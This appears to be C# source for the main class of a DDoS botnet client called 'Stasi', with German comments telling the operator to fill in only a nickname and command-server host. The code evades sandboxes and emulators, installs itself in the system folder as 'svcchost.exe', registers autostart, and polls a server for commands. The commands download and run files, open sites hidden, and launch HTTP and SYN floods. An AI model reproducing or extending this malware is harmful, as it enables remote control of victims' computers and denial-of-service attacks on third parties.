namespace Stasi
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Text;
    using System.Threading;
    using System.Web;
    using System.Windows.Forms;

    internal class MainClass
    {
        private string BotMutex = "saaASas31"; // Nicht ändern !
        private string BotOwner = "admin"; // Hier deinen Nickname
        private string BotServer = "http://localhost/";  // Hier deinen Host eintragen und fertig :-D
        private string BotVer = "ST01"; // Nicht ändern !
        private int ConnectionInterval = 1; // Nicht ändern !
        private string DropExeName = "svcchost.exe"; // Nicht ändern !
        private string DropFolder = Environment.SystemDirectory; // Nicht ändern !
        private HttpFlood Flood = new HttpFlood(); // Nicht ändern !
        private CollectInfos.PCInfos Info; // Nicht ändern !
        private string StartUpTitle = "Windows"; // Nicht ändern !
        private SuperSyn SupSyn = new SuperSyn();// Nicht ändern !
        // Ab hier nichts mehr ändern !
        public MainClass()
        {
            if (this.IsSandboxed() | this.IsEmulated())
            {
                Environment.Exit(0);
            }
            Installation installation = new Installation(this.DropFolder, this.DropExeName);
            RegStartWatcher watcher = new RegStartWatcher(this.StartUpTitle, Application.ExecutablePath);
            if (!installation.CheckAndCreateMutex(this.BotMutex))
            {
                Environment.Exit(0);
            }
            this.Info = CollectInfos.Collect();
            this.FirstStart();
            while (true)
            {
                try
                {
                    string parameters = "mode=2&hwid=" + this.Info.HWID;
                    string command = this.HttpPost(this.BotServer + "bot.php", parameters);
                    if (command.Length != 0)
                    {
                        this.ParseCommand(command);
                    }
                    else
                    {
                        this.ParseCommand("!wait");
                    }
                }
                catch
                {
                }
                Thread.Sleep((int) ((this.ConnectionInterval * 60) * 0x3e8));
            }
        }

        private void FirstStart()
        {
            try
            {
                string parameters = string.Concat(new object[] { "hwid=", this.HtmlEncode(this.Info.HWID), "&mode=1&nat=", this.Info.NatStatus, "&pcname=", this.HtmlEncode(this.Info.PcName), "&winver=", this.HtmlEncode(this.Info.WinVersion), "&country=", this.HtmlEncode(this.Info.Country), "&ver=", this.HtmlEncode(this.BotVer), "&own=", this.HtmlEncode(this.BotOwner) });
                string str2 = this.HttpPost(this.BotServer + "bot.php", parameters);
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
            }
        }

        private string GetParameterValue(string CommandLine, string ParameterName)
        {
            string str = "";
            try
            {
                if (CommandLine.Contains("-" + ParameterName + ":"))
                {
                    int startIndex = CommandLine.IndexOf("-" + ParameterName + ":") + (ParameterName.Length + 2);
                    string[] strArray = CommandLine.Substring(startIndex).Split(new char[] { ' ' });
                    foreach (string str3 in strArray)
                    {
                        if (!str3.StartsWith("-") | !str3.EndsWith(":"))
                        {
                            str = str + str3;
                        }
                        else
                        {
                            return str.Trim();
                        }
                    }
                    return str.Trim();
                }
                return null;
            }
            catch
            {
                return null;
            }
        }

        private string HtmlEncode(string text)
        {
            char[] chArray = HttpUtility.HtmlEncode(text).ToCharArray();
            StringBuilder builder = new StringBuilder(text.Length + ((int) (text.Length * 0.1)));
            foreach (char ch in chArray)
            {
                int num = Convert.ToInt32(ch);
                if (num > 0x7f)
                {
                    builder.AppendFormat("&#{0};", num);
                }
                else
                {
                    builder.Append(ch);
                }
            }
            return builder.ToString();
        }

        private string HttpPost(string URI, string Parameters)
        {
            WebRequest request = WebRequest.Create(URI);
            request.ContentType = "application/x-www-form-urlencoded";
            request.Method = "POST";
            byte[] bytes = Encoding.ASCII.GetBytes(Parameters);
            request.ContentLength = bytes.Length;
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            WebResponse response = request.GetResponse();
            if (response == null)
            {
                return null;
            }
            StreamReader reader = new StreamReader(response.GetResponseStream());
            return reader.ReadToEnd().Trim();
        }

        private bool IsEmulated()
        {
            Random random = new Random();
            try
            {
                int millisecondsTimeout = random.Next(0x1388, 0x2710);
                int tickCount = Environment.TickCount;
                Thread.Sleep(millisecondsTimeout);
                if (((tickCount + millisecondsTimeout) >= (Environment.TickCount - 20)) & ((tickCount + millisecondsTimeout) <= (Environment.TickCount + 20)))
                {
                    return false;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool IsSandboxed()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                foreach (ProcessModule module in currentProcess.Modules)
                {
                    if (module.ModuleName == "SbieDll.dll")
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        private void OpenSite(string Url, bool ShowWindow)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo(Url);
            if (ShowWindow)
            {
                startInfo.WindowStyle = ProcessWindowStyle.Normal;
            }
            else
            {
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            }
            Process.Start(startInfo);
        }

        private void ParseCommand(string Command)
        {
            try
            {
                string str5;
                int num2;
                if (Command.StartsWith("!opensite"))
                {
                    string parameterValue = this.GetParameterValue(Command, "site");
                    bool showWindow = Convert.ToBoolean(Convert.ToInt32(this.GetParameterValue(Command, "show")));
                    if (parameterValue != null)
                    {
                        this.OpenSite(parameterValue, showWindow);
                    }
                }
                if (Command.StartsWith("!webdl"))
                {
                    string address = this.GetParameterValue(Command, "file");
                    string path = this.GetParameterValue(Command, "dest");
                    string arguments = this.GetParameterValue(Command, "com");
                    bool flag2 = Convert.ToBoolean(Convert.ToInt32(this.GetParameterValue(Command, "start")));
                    if ((address != null) & (path != null))
                    {
                        path = Replace(path);
                        new WebClient().DownloadFile(address, path);
                        if (flag2)
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo(path, arguments);
                            Process.Start(startInfo);
                        }
                    }
                }
                if (Command.StartsWith("!httpflood"))
                {
                    str5 = this.GetParameterValue(Command, "file");
                    int num = Convert.ToInt32(this.GetParameterValue(Command, "int"));
                    num2 = Convert.ToInt32(this.GetParameterValue(Command, "threads"));
                    if ((str5 != null) & (num != 0))
                    {
                        if (this.Flood.IsEnabled)
                        {
                            this.Flood.StopHttpFlood();
                        }
                        if (this.SupSyn.IsEnabled)
                        {
                            this.SupSyn.StopSuperSyn();
                        }
                        this.Flood.Host = str5;
                        this.Flood.Interval = num;
                        this.Flood.Threads = num2;
                        this.Flood.StartHttpFlood();
                    }
                }
                if (Command.StartsWith("!reauth"))
                {
                    this.FirstStart();
                }
                if (Command.StartsWith("!stopflood"))
                {
                    if (this.Flood.IsEnabled)
                    {
                        this.Flood.StopHttpFlood();
                    }
                    if (this.SupSyn.IsEnabled)
                    {
                        this.SupSyn.StopSuperSyn();
                    }
                }
                if (Command.StartsWith("!supersyn"))
                {
                    str5 = this.GetParameterValue(Command, "host");
                    int num3 = Convert.ToInt32(this.GetParameterValue(Command, "port"));
                    num2 = Convert.ToInt32(this.GetParameterValue(Command, "threads"));
                    int num4 = Convert.ToInt32(this.GetParameterValue(Command, "sockets"));
                    if ((str5 != null) & (num3 != 0))
                    {
                        if (this.Flood.IsEnabled)
                        {
                            this.Flood.StopHttpFlood();
                        }
                        if (this.SupSyn.IsEnabled)
                        {
                            this.SupSyn.StopSuperSyn();
                        }
                        this.SupSyn.Host = str5;
                        this.SupSyn.Port = num3;
                        this.SupSyn.SuperSynSockets = num4;
                        this.SupSyn.Threads = num2;
                        this.SupSyn.StartSuperSyn();
                    }
                }
                if (Command.StartsWith("!close"))
                {
                    Environment.Exit(0);
                }
                if (Command.StartsWith("!restart"))
                {
                    Application.Restart();
                    Environment.Exit(0);
                }
            }
            catch
            {
            }
        }

        private static string Replace(string Path)
        {
            try
            {
                if (Path.Contains(":ApplicationData:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":CommonApplicationData:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":CommonProgramFiles:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Cookies:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Desktop:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":DesktopDirectory:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Favorites:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":History:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.History) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":InternetCache:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":LocalApplicationData:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":MyComputer:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.MyComputer) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":MyDocuments:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":MyMusic:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":MyPictures:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Personal:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":ProgramFiles:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Programs:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Programs) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Recent:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Recent) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":SendTo:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.SendTo) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":StartMenu:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Startup:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Startup) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":System:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.System) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":Templates:"))
                {
                    return (Environment.GetFolderPath(Environment.SpecialFolder.Templates) + Path.Split(new char[] { ':' })[2].Trim());
                }
                if (Path.Contains(":ComputerName:"))
                {
                    return Environment.MachineName;
                }
                if (Path.Contains(":UserName:"))
                {
                    return Environment.UserName;
                }
                return Path;
            }
            catch
            {
                return Path;
            }
        }
    }
}

